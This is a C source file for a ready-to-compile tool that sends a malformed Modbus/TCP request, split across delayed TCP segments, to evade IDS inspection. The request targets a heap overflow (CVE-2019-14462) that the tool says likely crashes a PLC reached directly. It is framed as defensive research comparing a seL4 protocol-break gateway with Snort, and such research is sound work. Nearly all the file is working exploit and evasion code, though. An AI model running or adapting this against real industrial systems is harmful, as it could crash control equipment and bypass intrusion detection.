/*
 * TCP Segmentation Evasion Attack
 *
 * This tool demonstrates how attackers can evade packet-forwarding IDS/IPS
 * by splitting malicious payloads across multiple TCP segments.
 *
 * Attack Technique:
 * - Send the MBAP header (7 bytes) in one TCP segment
 * - Delay, then send the malicious PDU in another segment
 * - IDS that doesn't properly reassemble streams may miss the attack
 *
 * Protocol-break gateways (like seL4) are immune because they:
 * - Terminate the TCP connection
 * - Buffer and reassemble the complete Modbus request
 * - Validate BEFORE forwarding to the protected system
 *
 * Compile: gcc -o tcp_segmentation_attack tcp_segmentation_attack.c
 * Usage:   ./tcp_segmentation_attack <IP> <PORT>
 *
 * For defensive security research only.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

/* CVE-2019-14462 parameters */
#define DECLARED_LENGTH 60
#define ACTUAL_PDU_LENGTH 600
#define MBAP_HEADER_SIZE 7

static void print_usage(const char *prog) {
    printf("TCP Segmentation Evasion Attack\n\n");
    printf("Usage: %s <IP> <PORT> [delay_ms]\n\n", prog);
    printf("This attack sends the MBAP header and PDU in separate TCP segments\n");
    printf("to evade packet-level inspection.\n\n");
    printf("Arguments:\n");
    printf("  delay_ms   Delay between segments in milliseconds (default: 100)\n\n");
    printf("Examples:\n");
    printf("  %s 127.0.0.1 502    # Through seL4 (blocked - TCP terminated)\n", prog);
    printf("  %s 127.0.0.1 503    # Through Snort (may evade detection)\n", prog);
    printf("  %s 127.0.0.1 5020   # Direct to PLC (attack succeeds)\n", prog);
}

static int tcp_connect(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    /* Disable Nagle's algorithm for precise segment control */
    int flag = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
        fprintf(stderr, "Invalid IP address: %s\n", ip);
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    return sock;
}

static void build_mbap_header(uint8_t *buf) {
    /* MBAP Header - declares small length but we'll send more */
    buf[0] = 0x00;  /* Transaction ID high */
    buf[1] = 0x01;  /* Transaction ID low */
    buf[2] = 0x00;  /* Protocol ID high */
    buf[3] = 0x00;  /* Protocol ID low */
    buf[4] = (DECLARED_LENGTH >> 8) & 0xFF;  /* Length high - LIES */
    buf[5] = DECLARED_LENGTH & 0xFF;         /* Length low */
    buf[6] = 0x01;  /* Unit ID */
}

static void build_malicious_pdu(uint8_t *buf, size_t len) {
    /* Read Holding Registers request */
    buf[0] = 0x03;  /* Function code */
    buf[1] = 0x00;  /* Start address high */
    buf[2] = 0x00;  /* Start address low */
    buf[3] = 0x00;  /* Quantity high */
    buf[4] = 0x10;  /* Quantity low */

    /* Overflow payload with DEADBEEF marker */
    for (size_t i = 5; i < len; i++) {
        static const uint8_t marker[] = {0xDE, 0xAD, 0xBE, 0xEF};
        buf[i] = marker[(i - 5) % sizeof(marker)];
    }
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int delay_ms = (argc > 3) ? atoi(argv[3]) : 100;

    if (target_port <= 0 || target_port > 65535) {
        fprintf(stderr, "Invalid port: %s\n", argv[2]);
        return EXIT_FAILURE;
    }

    printf("╔════════════════════════════════════════════════════════════════╗\n");
    printf("║  TCP Segmentation Evasion Attack                               ║\n");
    printf("║  Demonstrates IDS evasion via fragmented TCP segments          ║\n");
    printf("╚════════════════════════════════════════════════════════════════╝\n");
    printf("\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Segment delay: %d ms\n", delay_ms);
    printf("\n");

    printf("┌────────────────────────────────────────────────────────────────┐\n");
    printf("│  Attack Strategy                                               │\n");
    printf("├────────────────────────────────────────────────────────────────┤\n");
    printf("│                                                                │\n");
    printf("│  Segment 1: MBAP Header (7 bytes)                              │\n");
    printf("│    └─ Declares length: %d bytes                               │\n", DECLARED_LENGTH);
    printf("│                                                                │\n");
    printf("│  [delay %d ms]                                                │\n", delay_ms);
    printf("│                                                                │\n");
    printf("│  Segment 2: Malicious PDU (%d bytes)                         │\n", ACTUAL_PDU_LENGTH);
    printf("│    └─ Actual payload much larger than declared                 │\n");
    printf("│                                                                │\n");
    printf("│  IDS Evasion:                                                  │\n");
    printf("│    • Packet-level inspection sees separate small packets       │\n");
    printf("│    • Stream reassembly may timeout or fail                     │\n");
    printf("│    • Attack bypasses signature matching                        │\n");
    printf("│                                                                │\n");
    printf("│  Protocol-break Defense:                                       │\n");
    printf("│    • TCP terminated at gateway                                 │\n");
    printf("│    • Complete request buffered before validation               │\n");
    printf("│    • Length mismatch detected regardless of segmentation       │\n");
    printf("│                                                                │\n");
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\n");

    /* Prepare payloads */
    uint8_t mbap_header[MBAP_HEADER_SIZE];
    uint8_t pdu[ACTUAL_PDU_LENGTH];

    build_mbap_header(mbap_header);
    build_malicious_pdu(pdu, ACTUAL_PDU_LENGTH);

    /* Connect */
    printf("[1] Connecting to target...\n");
    int sock = tcp_connect(target_ip, target_port);
    if (sock < 0) {
        return EXIT_FAILURE;
    }
    printf("    Connected!\n\n");

    /* Send Segment 1: MBAP Header */
    printf("[2] Sending Segment 1: MBAP Header (%d bytes)...\n", MBAP_HEADER_SIZE);
    printf("    ");
    for (int i = 0; i < MBAP_HEADER_SIZE; i++) {
        printf("%02X ", mbap_header[i]);
    }
    printf("\n");

    if (send(sock, mbap_header, MBAP_HEADER_SIZE, 0) < 0) {
        perror("send segment 1");
        close(sock);
        return EXIT_FAILURE;
    }
    printf("    Sent!\n\n");

    /* Delay between segments */
    printf("[3] Waiting %d ms between segments...\n\n", delay_ms);
    usleep(delay_ms * 1000);

    /* Send Segment 2: Malicious PDU */
    printf("[4] Sending Segment 2: Malicious PDU (%d bytes)...\n", ACTUAL_PDU_LENGTH);
    printf("    First 20 bytes: ");
    for (int i = 0; i < 20; i++) {
        printf("%02X ", pdu[i]);
    }
    printf("...\n");

    if (send(sock, pdu, ACTUAL_PDU_LENGTH, 0) < 0) {
        perror("send segment 2");
        close(sock);
        return EXIT_FAILURE;
    }
    printf("    Sent!\n\n");

    /* Wait for response */
    printf("[5] Waiting for response...\n");
    uint8_t response[260];
    struct timeval tv = {5, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    ssize_t received = recv(sock, response, sizeof(response), 0);

    printf("\n");
    printf("╔════════════════════════════════════════════════════════════════╗\n");
    printf("║  RESULT                                                        ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");

    if (received <= 0) {
        printf("║  Connection closed or timed out                                ║\n");
        printf("║                                                                ║\n");
        if (target_port == 502) {
            printf("║  seL4 Gateway: Attack BLOCKED                                 ║\n");
            printf("║  • TCP terminated and request buffered                        ║\n");
            printf("║  • Length mismatch detected after reassembly                  ║\n");
        } else if (target_port == 503) {
            printf("║  Snort Gateway: Check Snort logs for alerts                   ║\n");
            printf("║  • Stream reassembly may have failed                          ║\n");
        } else {
            printf("║  Direct PLC: Likely CRASHED from heap overflow                ║\n");
        }
    } else {
        printf("║  Received %zd bytes response                                  ║\n", received);
        printf("║                                                                ║\n");
        printf("║  Server processed request - attack may have been mitigated    ║\n");
    }

    printf("║                                                                ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");
    printf("║  Comparison:                                                   ║\n");
    printf("║                                                                ║\n");
    printf("║  Packet-forwarding (Snort):                                    ║\n");
    printf("║    • Must reassemble stream for deep inspection                ║\n");
    printf("║    • Timing attacks can desync reassembly                      ║\n");
    printf("║    • Each segment may pass individual inspection               ║\n");
    printf("║                                                                ║\n");
    printf("║  Protocol-break (seL4):                                        ║\n");
    printf("║    • TCP terminates at gateway (not affected by segmentation)  ║\n");
    printf("║    • Complete Modbus PDU validated before new connection       ║\n");
    printf("║    • Evasion impossible - gateway sees full payload            ║\n");
    printf("║                                                                ║\n");
    printf("╚════════════════════════════════════════════════════════════════╝\n");

    close(sock);
    return EXIT_SUCCESS;
}
